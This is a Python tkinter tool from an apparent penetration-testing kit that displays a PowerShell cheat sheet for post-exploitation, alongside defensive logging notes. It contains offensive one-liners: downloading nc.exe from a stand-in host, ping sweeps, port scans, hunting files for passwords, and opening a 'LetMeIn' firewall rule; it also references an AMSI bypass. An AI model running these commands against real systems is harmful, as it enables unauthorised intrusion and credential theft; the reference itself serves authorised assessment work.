#!/usr/bin/env python3

from tkinter import *
import subprocess
import os, sys, shlex
from datetime import datetime
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from config import VENDOR_DIR, WORKING_DIR

#Define variables outside functions here:

info = r'''

     ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗
     ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██╔════╝██║  ██║██╔════╝██║     ██║
     ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝███████╗███████║█████╗  ██║     ██║
     ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗╚════██║██╔══██║██╔══╝  ██║     ██║
     ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║███████║██║  ██║███████╗███████╗███████╗
     ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝

     ██╗███╗   ██╗███████╗ ██████╗
     ██║████╗  ██║██╔════╝██╔═══██╗
     ██║██╔██╗ ██║█████╗  ██║   ██║
     ██║██║╚██╗██║██╔══╝  ██║   ██║
     ██║██║ ╚████║██║     ╚██████╔╝
     ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝

##########################################################################################

powershell_info  -  PowerShell language, cmdlet and post-exploitation cheat-sheet

A working reference for operating on Windows with PowerShell during a
cyberworthiness assessment: WinRM remoting setup, output formatting, host/OS/WMI
queries, the essential cmdlets and aliases, pen-tester post-exploitation
one-liners (ping sweep, port scan, HTTP download, registry autoruns, firewall
rules, base64), discovery (Get-Command / Get-Help / Get-Member), and the
PowerShell logging event IDs the blue team relies on.

when to use it
    - you have a PowerShell prompt on a target (or Kali pwsh) and need exact syntax
    - building a one-liner for enumeration, transfer, or a quick scan without extra tools
    - most common use: the "PowerShell for Pen-Tester Post-Exploitation" and "Useful Cmdlets" sections below

pair with
    powershell_enum / powershell_exploit / powershell_scripts   the scripted workflows
    powershell_amsi_bypass    when your one-liners get flagged
    exploit_winpeas           when you want automated privesc enum instead of manual cmdlets
    info_linux                the equivalent Linux-side reference

gotchas
    - script-block (4104) and module (4103) logging capture the command text even when
      it fails or is obfuscated - assume everything you type is recorded and forwarded
    - AMSI scans every string before execution; download-cradles and Invoke-Expression
      are the first to trip it - powershell_amsi_bypass first, or work from disk
    - Constrained Language Mode (WDAC / AppLocker) blocks Add-Type, COM and most
      offensive one-liners - check $ExecutionContext.SessionState.LanguageMode early
    - -ExecutionPolicy Bypass is not a security control and not the thing stopping you;
      CLM, AMSI and app-control are
    - Windows PowerShell 5.1 and PowerShell 7 (pwsh) differ in modules, .NET and
      logging - a cmdlet that works in one may be missing in the other
    - one-liners that reach out (Invoke-WebRequest, DownloadString) need egress and a
      reachable LHOST; proxy / TLS inspection breaks them quietly

authorisation & reporting
    - most of this is passive local enum; ping sweeps, port scans, and firewall-rule
      changes are active - stay in scope, revert any config you change
    - the logging section is the defensive angle: note whether 4103/4104 script-block
      + module logging are enabled and forwarded (they usually reveal everything you did)
    - fix = enable + forward PowerShell logging, Constrained Language Mode via WDAC,
      remove PowerShell v2, EDR

##########################################################################################

#ON TARGET for remote access
#MUST Enable-PSRemoting -f
#MUST Enable-PSRemoting -SkipNetworkProfileCheck
#MUST set-item WSMan:\\localhost\\client\\trustedhosts -Value *
#MUST Restart-Service WinRM
#MUST Test-WsMan IP
#MUST allow any any on ports 135,5985,5986  #this ports used by WinRM

#KALI PS> Install-Module -Name PowerShellGet
#KALI PS> Install-Module -Name PSWSMan
#KALI sudo pwsh -Command 'Install-WSMan'

Powershell_Manuals.txt  #located:/opt/SKELETON/vendor/powershell/
	all remote access scripts

##########################################################################################

Output:
	Format_List -Property Date, ...  #text based output
	Out-GridView  #GUI output
	Format-Wide

To get windows info:
	PS C:\\> systeminfo
	         Get-WmiObject -Class win32_OperatingSystem  #OS
	                              win32_Process  #processes
	                              win32_Service  #services
	                              win32_Bios  #Bios

	PS command | findstr.exe "string"  #find string in output
	Get-FileHash -Algorithm MD5 file_name.exe
        Get-Content file_name  #cat for powershell

Compare 2 text files:
	Compare-Object -ReferenceObject (Get-Content -Path file1.txt) -DifferenceObject (Get-Content -Path file2.txt)

DNS analysis:
        Set-DnsClientServerAddress -InterfaceAlias Ethernet0 -ServerAddresses ("10.10.10.10")  #change DNS server
        Add-Content -Path C:\windows\system32\drivers\etc\hosts -Value " IP_address   www.website.com"  #add dns response:
        nc -n -v -i -p PORT  @listen for request after DNS resolved

        Unregister-ScheduledTask -TaskName "Task_Name"  #delete scheduled task

PowerShell cmdlets can be called from cmd.exe by typing:
	C:\\> powershell -c "<command>"

WEB REQUEST:
Invoke-WebRequest 'http://website' | Select-Object -Expand Content  #return source code

##########################################################################################

Useful Cmdlets (and aliases)

ls env:   #list enviroment variables

Get a directory listing (ls, dir, gci):
	PS C:\\> Get-ChildItem -Hidden -Recurse #list everything
Copy a file (cp, copy, cpi):
	PS C:\\> Copy-Item src.txt dst.txt
Move a file (mv, move, mi):
	PS C:\\> Move-Item src.txt dst.txt
Find text within a file:
	PS C:\\> Select-String –path c:\\users\\*.txt –pattern password
	PS C:\\> ls -r c:\\users\\*.txt -file | % {Select-String -path $_ -pattern password}
Display file contents (cat, type, gc):
	PS C:\\> Get-Content file.txt
Get present directory (pwd, gl):
	PS C:\\> Get-Location
Get a process listing (ps, gps):
	PS C:\\> Get-Process
Get a service listing:
	PS C:\\> Get-Service
Get aliases
	Get-Alias *
Formatting output of a command (Format-List):
	PS C:\\> ls | Format-List –property name
Paginating output:
	PS C:\\> ls –r | Out-Host -paging
Get the SHA1 hash of a file:
	PS C:\\> Get-FileHash -Algorithm SHA1 file.txt
Exporting output to CSV:
	PS C:\\> Get-Process | Export-Csv procs.csv

##########################################################################################

PowerShell for Pen-Tester Post-Exploitation

Conduct a ping sweep:
	PS C:\\> 1..255 | % {echo "10.10.10.$_";ping -n 1 -w 100 10.10.10.$_ | Select-String ttl}
Conduct a port scan:
	PS C:\\> 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.10",$_)) "Port $_ is open!"} 2>$null
Fetch a file via HTTP (wget in PowerShell):
	PS C:\\> (New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/nc.exe","nc.exe")
Find all files with a particular name:
	PS C:\\> Get-ChildItem "C:\\Users\\" -recurse -include *passwords*.txt
Get a listing of all installed Microsoft Hotfixes:
	PS C:\\> Get-HotFix
Navigate the Windows registry:
	PS C:\\> Get-ChildItem HKLM:Software | Format-Wide
	PS C:\\> cd HKLM:\\
	PS HKLM:\\> ls
List programs set to start automatically in the registry:
	PS C:\\> Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\run
Convert string from ascii to Base64:
	PS C:\\>[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("PSFTW!"))
List and modify the Windows firewall rules:
	PS C:\\> Get-NetFirewallRule –all
	PS C:\\> New-NetFirewallRule -Action Allow -DisplayName LetMeIn -RemoteAddress 10.10.10.25

##########################################################################################

Finding Cmdlets

To get a list of all available cmdlets:
	PS C:\\> Get-Command
Get-Command supports filtering. To filter cmdlets on the verb set:
	PS C:\\> Get-Command Set*
	PS C:\\> Get-Command –Verb Set
Or on the noun process:
	PS C:\\> Get-Command *Process
	PS C:\\> Get-Command –Noun process

##########################################################################################

Getting Help

To get help with help:
	PS C:\\> Get-Help
To read cmdlet self documentation:
	PS C:\\> Get-Help <cmdlet>
Detailed help:
	PS C:\\> Get-Help <cmdlet> -detailed
Usage examples:
	PS C:\\> Get-Help <cmdlet> -examples
Full (everything) help:
	PS C:\\> Get-Help <cmdlet> -full
Online help (if available):
	PS C:\\> Get-Help <cmdlet> -online

##########################################################################################

Cmdlet Aliases, aliases provide short references to long commands

To list available aliases (alias alias):
	PS C:\\> Get-Alias
To expand an alias into a full name:
	PS C:\\> alias <unknown alias>
	PS C:\\> alias gcm
	PS C:\\> alias *  #all

##########################################################################################

Efficient PowerShell

Tab completion:
	PS C:\\> get-child<TAB>
	PS C:\\> Get-ChildItem
Parameter shortening:
	PS C:\\> ls –recurse
is equivalent to:
	PS C:\\> ls -r

##########################################################################################

PowerShell Essentials

Shows help & examples
	PS C:\\> Get-Help [cmdlet] -examples
Alias
	PS C:\\> help [cmdlet] -examples
Shows a list of commands
	PS C:\\> Get-Command
Alias
	PS C:\\> gcm *[string]*
Shows properties & methods
	PS C:\\> [cmdlet] | Get-Member
Alias
	PS C:\\> [cmdlet] | gm
Takes each item on pipeline and handles it as $_
	PS C:\\> ForEach-Object { $_ }
Alias
	PS C:\\> [cmdlet] | % { [cmdlet] $_ }
Searches for strings in files or output, like grep
	PS C:\\> Select-String
Alias
	PS C:\\> sls –path [file] –pattern [string]

##########################################################################################

Pipelining, Loops, and Variables

Piping cmdlet output to another cmdlet:
	PS C:\\> Get-Process | Format-List –property name
ForEach-Object in the pipeline (alias %):
	PS C:\\> ls *.txt | ForEach-Object {cat $_}
Where-Object condition (alias where or ?):
	PS C:\\> Get-Process | Where-Object {$_.name –eq "notepad"}
Generating ranges of numbers and looping:
	PS C:\\> 1..10
	PS C:\\> 1..10 | % {echo "Hello!"}
Creating and listing variables:
	PS C:\\> $tmol = 42
	PS C:\\> ls variable:
Examples of passing cmdlet output down pipeline:
	PS C:\\> dir | group extension | sort
	PS C:\\> Get-Service dhcp | Stop-Service -PassThru | Set-Service -StartupType Disabled

##########################################################################################

PoSh-R2  #located: /opt/SKELETON/vendor/powershell/PoSh-R2/

https://github.com/WiredPulse/PoSh-R2.git

PoSH-R2 is a set of Windows Management Instrumentation (WMI) scripts that retrieve information from a compromised (or potentially compromised) Windows system. The scripts use WMI to pull this information from the operating system.

##########################################################################################

Security event logs for PowerShell:
4103        Module logging and pipeline output
4104        Script block logging
4105/4106   Script Start/Stop (not recommended)

##########################################################################################

Use PowerShell to gather logs:
Get-WinEvent -ComputerName  #remote collection
Get-WinEvent -Logname  #local events
Get-WinEvent -Path  #archived log files

Example:
Get-WinEvent -FilterHashtable @{Logname=“Security";id=4624} | Where {$_.Message -match “spsql"}

Get-WinEvent -FilterHashtable @{Path="C:\\Path-To-Exported\\Security*.evtx“ ;id=5140} | Where {$_.Message -match "\\\\Admin\\$"}

##########################################################################################

get-ciminstance modern replacements for get-wmiobject
  query os details:
    Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version,OSArchitecture,LastBootUpTime

  query processes with commandline arguments:
    Get-CimInstance Win32_Process | Select-Object ProcessId,Name,CommandLine
'''

#GUI

#Creates $guibox window to populate all the gui
guibox = Tk()
guibox.title('powershell_info  —  useful PowerShell commands reference')   #window title: tool name + purpose
guibox.geometry("950x900")   #size for the window guibox

#Define functions

def NEW_Terminal():
    subprocess.call(["gnome-terminal"])


def LOG(cmd):
    stamp = datetime.now().strftime("%d-%b-%Y (%H:%M:%S.%f)")
    text_box.insert('end', "\nTime stamp: {} - {}\n".format(stamp, cmd))
    text_box.yview('end')

def RUN_cmd_terminal(cmd):
    subprocess.call(['gnome-terminal -- bash -c ' + shlex.quote(cmd + ' ; exec bash')], shell=True)
    LOG(cmd)

def OPEN_pwsh_vendor():
    cmd = "cd " + shlex.quote(str(VENDOR_DIR / "powershell")) + " && pwsh"
    RUN_cmd_terminal(cmd)

def RUN_pwsh_cmd():
    cmd_val = shlex.quote(ps_cmd_entry.get().strip() or "$PSVersionTable")
    outfile = shlex.quote(str(WORKING_DIR / (os.path.basename(outfile_entry.get().strip()) or "pwsh_info_out.txt")))
    cmd = "pwsh -NoLogo -NoProfile -Command " + cmd_val + " | tee " + outfile
    RUN_cmd_terminal(cmd)

def VIEW_ps_manuals():
    doc = shlex.quote(str(VENDOR_DIR / "powershell" / "Powershell_Manuals.txt"))
    cmd = "less " + doc
    RUN_cmd_terminal(cmd)

def RUN_in_Terminal():
    run_powershell = subprocess.call(['gnome-terminal -- bash -c "cd powershell; pwsh"'], shell = True) #starts powershell

#Grid Frames
frame_main = Frame(guibox)
frame_main.grid(row=0, column=0, columnspan=1, padx=5, pady=0, sticky="nsew")
guibox.rowconfigure(0, weight=1)
guibox.columnconfigure(0, weight=1)
frame_main.rowconfigure(1, weight=1)
frame_main.columnconfigure(0, weight=1)

frame_message = Frame(frame_main)
frame_message.grid(row=1, column=0, columnspan=1, padx=5, pady=5, sticky="nsew")

frame_buttons1 = Frame(frame_main)
frame_buttons1.grid(row=2, column=0, columnspan=8, padx=5, pady=5)

#interface
text_box = Text(   #creates text box inside frame_message with the info text
    frame_message,
    height=45,
    width=115
)
text_box.grid(row=1)

text_box.insert('end', info)   #adds info to the end of text_box
text_box.pack(side=LEFT, fill=BOTH, expand=True)   #config for slider variant
text_box.yview('1.0')

sb = Scrollbar(frame_message)   #assign scrollbar
sb.pack(side=RIGHT, fill=BOTH)   #scrollbar configuration

text_box.config(yscrollcommand=sb.set)   #set scrollbar on y axis
sb.config(command=text_box.yview)

NEW_button = Button(frame_buttons1, text=" NEW Terminal ", command=NEW_Terminal)
NEW_button.grid(row=2, column=0, padx=5, pady=5)

NEW_button2 = Button(frame_buttons1, text=" OPEN powershell ", command=RUN_in_Terminal)
NEW_button2.grid(row=2, column=1, padx=5, pady=5)


frame_fields = Frame(frame_main)
frame_fields.grid(row=2, column=0, columnspan=8, padx=5, pady=4)

ps_cmd_label = Label(frame_fields, text="Local pwsh command (-c): ")
ps_cmd_label.grid(row=0, column=0, padx=5, pady=4, sticky='e')
ps_cmd_entry = Entry(frame_fields, width=34)
ps_cmd_entry.grid(row=0, column=1, padx=5, pady=4)
ps_cmd_entry.insert(0, "$PSVersionTable")

outfile_label = Label(frame_fields, text="Save-file name (no spaces): ")
outfile_label.grid(row=0, column=2, padx=5, pady=4, sticky='e')
outfile_entry = Entry(frame_fields, width=24)
outfile_entry.grid(row=0, column=3, padx=5, pady=4)
outfile_entry.insert(0, "pwsh_info_out.txt")

PWSH_v_btn = Button(frame_buttons1, text=" PWSH (vendor/powershell) ", command=OPEN_pwsh_vendor)
PWSH_v_btn.grid(row=0, column=2, padx=5, pady=5)

PWSH_cmd_btn = Button(frame_buttons1, text=" RUN in local pwsh ", command=RUN_pwsh_cmd)
PWSH_cmd_btn.grid(row=0, column=3, padx=5, pady=5)

MANUALS_btn = Button(frame_buttons1, text=" VIEW Powershell_Manuals.txt ", command=VIEW_ps_manuals)
MANUALS_btn.grid(row=0, column=4, padx=5, pady=5)

guibox.mainloop()   #generates guibox window
